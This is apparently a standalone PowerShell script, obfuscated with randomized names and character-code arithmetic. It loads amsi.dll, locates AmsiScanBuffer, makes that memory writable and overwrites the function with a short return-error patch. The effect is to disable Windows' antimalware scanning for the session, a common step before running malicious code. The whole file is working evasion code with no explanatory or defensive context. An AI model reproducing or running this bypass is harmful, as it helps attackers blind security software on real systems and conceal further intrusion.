$n3k6eQVYSPtVfvgIn37t = @"
using System;
using System.Runtime.InteropServices;
public class n3k6eQVYSPtVfvgIn37t {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr DUjN1RYhy, string YMDCsxfNMWi71qmCHP_b);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr bP_IJEdR, UIntPtr p20GCLV5IU6DD07hFs, uint a8hYJRsZLehoDSnTU, out uint Yya8uIiGZapt114yb);
}
"@

Add-Type $n3k6eQVYSPtVfvgIn37t

$H78qJkMH4iv5lSdWh4fq = [n3k6eQVYSPtVfvgIn37t]::LoadLibrary("$(('ãms'+'î.d'+'ll').normaLiZe([chaR](32+38)+[ChAr](111*33/33)+[ChAR](114*26/26)+[cHaR](109+72-72)+[ChaR]([byte]0x44)) -replace [ChaR]([Byte]0x5c)+[chAr]([bYTE]0x70)+[char](123+39-39)+[cHaR]([BytE]0x4d)+[ChaR]([bytE]0x6e)+[CHAR]([bYTE]0x7d))")
$bYJUxe = [n3k6eQVYSPtVfvgIn37t]::GetProcAddress($H78qJkMH4iv5lSdWh4fq, "$([cHAR](65+51-51)+[cHaR](78+31)+[chAR]([ByTe]0x73)+[cHar]([BYTe]0x69)+[cHAr](83+72-72)+[cHar](99*94/94)+[char](97*80/80)+[cHar](110+56-56)+[CHar]([BYTe]0x42)+[ChaR]([BYTe]0x75)+[cHaR]([bytE]0x66)+[cHAr](102*64/64)+[cHAR](6+95)+[chAR]([byte]0x72))")
$p = 0
[n3k6eQVYSPtVfvgIn37t]::VirtualProtect($bYJUxe, [uint32]5, 0x40, [ref]$p)
$ly_ySrM8RhlIfM29VjwY = "0xB8"
$oKJaYISGRqMZd6Vjy7 = "0x57"
$gP7K1JfmO2 = "0x00"
$WtlLW = "0x07"
$D4AWcJ = "0x80"
$KY2oov060sjYG = "0xC3"
$LJ6ypzOn1lSLOr = [Byte[]] ($ly_ySrM8RhlIfM29VjwY,$oKJaYISGRqMZd6Vjy7,$gP7K1JfmO2,$WtlLW,+$D4AWcJ,+$KY2oov060sjYG)
[System.Runtime.InteropServices.Marshal]::Copy($LJ6ypzOn1lSLOr, 0, $bYJUxe, 6)